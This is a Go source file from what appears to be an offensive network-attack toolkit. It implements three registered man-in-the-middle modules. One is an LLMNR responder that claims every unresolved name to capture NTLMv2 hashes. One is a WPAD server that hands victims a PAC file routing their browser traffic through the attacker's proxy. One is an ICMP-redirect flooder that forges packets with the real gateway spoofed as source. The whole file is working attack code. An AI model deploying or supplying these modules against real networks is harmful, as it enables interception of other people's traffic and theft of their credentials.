package mitm

import (
	"fmt"
	"net"
	"net/http"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/netx/llmnr"
	"github.com/qyvora/toha3ee/internal/safety"
)

// init registers the LLMNR, WPAD and ICMP-redirect poisoning modules.
func init() {
	attacks.Register(&LLMNRSpoof{})
	attacks.Register(&WPADSpoof{})
	attacks.Register(&ICMPRedirect{})
}

// LLMNRSpoof answers LLMNR name-resolution failures, claiming every name.
type LLMNRSpoof struct{}

// Meta implements attacks.Module, returning the module's registry descriptor.
func (*LLMNRSpoof) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:       "llmnr.poison",
		Category: "mitm",
		Risk:     attacks.RiskMedium,
		Targets:  []string{"host"},
		// No Requires entry: LLMNR listens on the non-privileged UDP port 5355,
		// so neither root nor a raw socket is needed to run the responder.
		Description: "answer LLMNR (port 5355) resolution failures with this host's address to capture NTLMv2 hashes",
		Limitations: "only triggered when victims' DNS lookups fail; Windows clients retry NetBIOS if this is answered inconsistently",
	}
}

// Preflight checks bindability and MITM state.
func (*LLMNRSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	rep.AddOK("bind", "UDP 5355 is a non-privileged port")
	// A default gateway suggests a routed network where the poisoned traffic
	// triggered by LLMNR failures will actually pass through this host.
	if gw, err := ctx.Iface.Gateway(); err == nil && gw != nil {
		rep.AddOK("iface", ctx.Iface.String())
	} else {
		rep.AddFixable("mitm", "no poisoned network detected; run arp.spoof first for full effect")
	}
	return rep, nil
}

// Run starts the responder.
func (*LLMNRSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	r := llmnr.New(ctx.Iface.IP, ctx.Bus, ctx.Store)
	if err := r.Start(); err != nil {
		return fmt.Errorf("llmnr.poison: %w", err)
	}
	ctx.SetState("llmnr.poison", r)
	ctx.Safety.RegisterCleanup("llmnr.poison", "stop LLMNR responder", func() error {
		r.Stop()
		return nil
	})
	ctx.Printf("[*] llmnr.poison listening on :5355 (will claim unresolved names as %s).\n", ctx.Iface.IP)

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("llmnr.poison", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports responder counters.
func (*LLMNRSpoof) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("llmnr.poison")
	if !ok {
		return nil, fmt.Errorf("llmnr.poison not running")
	}
	r := v.(*llmnr.Responder)
	imp := &attacks.Impact{
		// Poisoned counts queries we answered; Queries is the raw total heard.
		Summary: fmt.Sprintf("poisoned %d LLMNR queries (%d total)", r.Poisoned.Load(), r.Queries.Load()),
	}
	imp.Add("poisoned", fmt.Sprintf("%d", r.Poisoned.Load()))
	imp.Add("queries", fmt.Sprintf("%d", r.Queries.Load()))
	return imp, nil
}

// Cleanup stops the responder.
func (*LLMNRSpoof) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("llmnr.poison")
	ctx.Safety.UnregisterCleanup("llmnr.poison")
	if v, ok := ctx.GetState("llmnr.poison"); ok {
		v.(*llmnr.Responder).Stop()
	}
	return nil
}

// WPADSpoof serves a PAC file that forces victims' browsers to use our proxy.
type WPADSpoof struct{}

// Meta implements attacks.Module, returning the module's registry descriptor.
func (*WPADSpoof) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "wpad.poison",
		Category:    "mitm",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"host"},
		Description: "answer wpad.dat requests with a PAC file routing browser traffic through this host",
		Limitations: "requires the victim to resolve 'wpad' (pair with dns.spoof or llmnr.poison); modern browsers and proxies with bypass lists are immune",
	}
}

// wpadState is the per-run state for the WPAD PAC HTTP server, kept so Verify
// and Cleanup can reach the listener and the Serve goroutine's exit signal.
type wpadState struct {
	srv *http.Server // HTTP server serving /wpad.dat
	ln  net.Listener // bound TCP listener on :80
	n   chan error   // receives the result of srv.Serve so Run can detect exits
}

// Preflight warns about dependencies.
func (*WPADSpoof) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	rep.AddOK("bind", "HTTP :80 served from this host")
	rep.AddFixable("wpad", "victims must resolve 'wpad.localdomain' or 'wpad'; run dns.spoof with domain 'wpad' or llmnr.poison to assist")
	return rep, nil
}

// Run serves the PAC file and blocks.
func (m *WPADSpoof) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	// The PAC script tells the browser to send everything through
	// this host:proxy_port except localhost and this host itself, so our own
	// traffic stays direct and does not loop back into the proxy.
	proxyPort := ctx.Conf.GetDefault("wpad.poison", "proxy_port", "3128")
	pac := fmt.Sprintf(`function FindProxyForURL(url, host) {
  if (host == "localhost" || host == "%s") return "DIRECT";
  return "PROXY %s:%s; DIRECT";
}`,
		ctx.Iface.IP, ctx.Iface.IP, proxyPort)

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/wpad.dat" {
			// The WPAD spec mandates this exact content-type; no-cache forces
			// browsers to re-fetch so PAC updates take effect quickly.
			w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
			w.Header().Set("Cache-Control", "no-cache")
			fmt.Fprint(w, pac)
			ctx.Emit(events.TopicLog, fmt.Sprintf("wpad.poison: served PAC to %s", r.RemoteAddr), nil)
			return
		}
		// Anything else hitting this port gets a plain 404.
		http.NotFound(w, r)
	})

	srv := &http.Server{Handler: handler}
	ln, err := net.Listen("tcp", ctx.Iface.IP.String()+":80")
	if err != nil {
		return fmt.Errorf("wpad.poison: %w", err)
	}
	// Serve in a goroutine and push its result down a buffered channel so Run
	// can observe an unexpected server exit without blocking the handler.
	done := make(chan error, 1)
	go func() { done <- srv.Serve(ln) }()

	ctx.SetState("wpad.poison", &wpadState{srv: srv, ln: ln, n: done})
	ctx.Safety.RegisterCleanup("wpad.poison", "stop WPAD PAC server", func() error {
		_ = srv.Close()
		_ = ln.Close()
		return nil
	})
	ctx.Printf("[*] wpad.poison serving PAC on http://%s/wpad.dat (proxy %s:%s).\n",
		ctx.Iface.IP, ctx.Iface.IP, proxyPort)

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("wpad.poison", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case err := <-done:
			// A clean close during shutdown reports http.ErrServerClosed and is
			// not an error; anything else means the listener died on its own.
			if err != nil && err != http.ErrServerClosed {
				return fmt.Errorf("wpad.poison: %w", err)
			}
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports the PAC server state.
func (*WPADSpoof) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("wpad.poison")
	if !ok {
		return nil, fmt.Errorf("wpad.poison not running")
	}
	st := v.(*wpadState)
	return &attacks.Impact{Summary: "PAC server active; victims fetching /wpad.dat route through this host", Metrics: map[string]string{"listener": st.ln.Addr().String()}}, nil
}

// Cleanup stops the PAC server.
func (*WPADSpoof) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("wpad.poison")
	ctx.Safety.UnregisterCleanup("wpad.poison")
	if v, ok := ctx.GetState("wpad.poison"); ok {
		st := v.(*wpadState)
		_ = st.srv.Close()
		_ = st.ln.Close()
	}
	return nil
}

// ICMPRedirect sends forged ICMP redirects that repoint victims' routes for
// target subnets through this host.
type ICMPRedirect struct{}

// Meta implements attacks.Module, returning the module's registry descriptor.
func (*ICMPRedirect) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:       "icmp.redirect",
		Category: "mitm",
		Risk:     attacks.RiskMedium,
		Targets:  []string{"host"},
		// Forging the redirect and spoofing the gateway source requires raw
		// L2 frame injection.
		Requires:    []string{"cap.raw_socket"},
		Description: "forge ICMP redirects telling victims to route target subnets through this host",
		Limitations: "modern OSes ignore ICMP redirects on unauthenticated hosts and for on-link subnets",
	}
}

// Preflight requires root and a poisonable network.
func (*ICMPRedirect) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err != nil {
		rep.AddBlocked("root", err.Error())
	} else {
		rep.AddOK("root", "raw socket injection available")
	}
	if gw, _ := ctx.Iface.Gateway(); gw == nil {
		rep.AddFixable("gateway", "no default gateway; redirects cannot be forged")
	} else {
		rep.AddOK("gateway", gw.String())
	}
	rep.AddFixable("mitm", "combine with arp.spoof for reliable delivery")
	return rep, nil
}

// Run floods redirects to each victim until ctx.Done.
func (m *ICMPRedirect) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	gw, err := ctx.Iface.Gateway()
	if err != nil {
		return fmt.Errorf("icmp.redirect: %w", err)
	}
	// OpenLive gives a raw pcap handle we can use to inject fully crafted
	// Ethernet frames; promiscuous mode is requested but only matters for
	// capture, not for sending.
	handle, err := pcap.OpenLive(ctx.Iface.Name, 65535, true, 500*time.Millisecond)
	if err != nil {
		return fmt.Errorf("icmp.redirect: %w", err)
	}
	defer handle.Close()

	interval := ctx.Conf.GetDuration("icmp.redirect", "interval", 2*time.Second)
	victims := ctx.Store.Hosts()
	if len(victims) == 0 {
		return fmt.Errorf("icmp.redirect: no victims; run net.scan first")
	}

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("icmp.redirect", hb)
	ctx.SetState("icmp.redirect", &icmpState{handle: handle, sent: new(int64)})
	// The pcap handle is closed by defer; the cleanup hook is a no-op marker
	// so the safety layer knows the module's teardown was registered.
	ctx.Safety.RegisterCleanup("icmp.redirect", "stop ICMP redirect flood", func() error { return nil })

	ctx.Printf("[*] icmp.redirect: redirecting %d victim(s) to route via %s.\n", len(victims), ctx.Iface.IP)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(interval):
			// For every victim x target combination, forge a redirect; each
			// successful injection bumps the counter stored in ctx state.
			for _, v := range victims {
				for _, target := range optsTargets(ctx, opts) {
					if err := sendRedirect(handle, ctx.Iface.MAC, gw, v.IP, v.MAC, target, ctx.Iface.IP); err == nil {
						if st, ok := ctx.GetState("icmp.redirect"); ok {
							(*st.(*icmpState).sent)++
						}
					}
				}
			}
			hb.Beat()
		}
	}
}

// icmpState is the per-run state kept for Verify and Cleanup.
type icmpState struct {
	handle *pcap.Handle // raw pcap handle used for frame injection
	sent   *int64       // packet counter shared with Verify
}

// optsTargets chooses the subnet(s) to redirect: an explicit "targets" run
// option wins, otherwise the interface's default gateway is the target so
// victims re-route their internet-bound traffic through us.
func optsTargets(ctx *attacks.AttackCtx, opts map[string]string) []net.IP {
	if t := opts["targets"]; t != "" {
		if ips, err := attacks.ExpandTargets(ctx, t, false); err == nil {
			return ips
		}
	}
	gw, _ := ctx.Iface.Gateway()
	if gw != nil {
		return []net.IP{gw}
	}
	return nil
}

// sendRedirect crafts and injects a single ICMP redirect packet at L2.
func sendRedirect(handle *pcap.Handle, attackerMAC net.HardwareAddr, gw, victim net.IP, vmac net.HardwareAddr, target, newGateway net.IP) error {
	// Without a known victim MAC, broadcast the frame so the victim's NIC
	// still receives it (switches flood frames to unknown broadcast
	// destinations).
	if vmac == nil {
		vmac = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	}
	gw4 := newGateway.To4()
	if gw4 == nil {
		return fmt.Errorf("bad redirect gateway %s", newGateway)
	}
	// ICMP redirect layout after the checksum is the 4-byte new-gateway
	// field followed by the original datagram's IP header + 8 bytes. gopacket
	// serializes the gateway field into Id/Seq.
	icmp := &layers.ICMPv4{
		// Type 5 code 1 = "redirect datagram for the host" (we redirect only
		// the victim's traffic to one specific host, not a whole subnet).
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeRedirect, 1),
		// The 32-bit gateway IP is split across the 16-bit Id and Seq fields
		// to fit gopacket's ICMPv4 layout.
		Id:  uint16(gw4[0])<<8 | uint16(gw4[1]),
		Seq: uint16(gw4[2])<<8 | uint16(gw4[3]),
	}
	// Echoed original header: the "packet that triggered the redirect". The
	// victim only honors the redirect if it quotes an in-flight packet to the
	// target; we synthesize one from the victim's perspective.
	echo := &layers.IPv4{
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    victim,
		DstIP:    target,
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	// The outer IP header is spoofed with the gateway as source so the victim
	// believes its real router sent the redirect.
	ip := &layers.IPv4{
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolICMPv4,
		SrcIP:    gw,
		DstIP:    victim,
	}
	// Ethernet frame: our MAC as source, the victim's MAC (or broadcast) as
	// destination.
	eth := &layers.Ethernet{
		SrcMAC:       attackerMAC,
		DstMAC:       vmac,
		EthernetType: layers.EthernetTypeIPv4,
	}
	// The trailing 8 zero bytes complete the quoted original datagram's
	// payload (IP header + 8 bytes minimum per RFC 792).
	if err := gopacket.SerializeLayers(buf, opts, eth, ip, icmp, echo, gopacket.Payload(make([]byte, 8))); err != nil {
		return err
	}
	return handle.WritePacketData(buf.Bytes())
}

// Verify reports the packet count.
func (*ICMPRedirect) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("icmp.redirect")
	if !ok {
		return nil, fmt.Errorf("icmp.redirect not running")
	}
	st := v.(*icmpState)
	imp := &attacks.Impact{Summary: fmt.Sprintf("sent %d forged ICMP redirect(s)", *st.sent)}
	imp.Add("packets_sent", fmt.Sprintf("%d", *st.sent))
	return imp, nil
}

// Cleanup stops the flood.
func (*ICMPRedirect) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("icmp.redirect")
	ctx.Safety.UnregisterCleanup("icmp.redirect")
	return nil
}

// Compile-time assertions that all three modules in this file implement
// attacks.Module.
var (
	_ attacks.Module = (*LLMNRSpoof)(nil)
	_ attacks.Module = (*WPADSpoof)(nil)
	_ attacks.Module = (*ICMPRedirect)(nil)
)
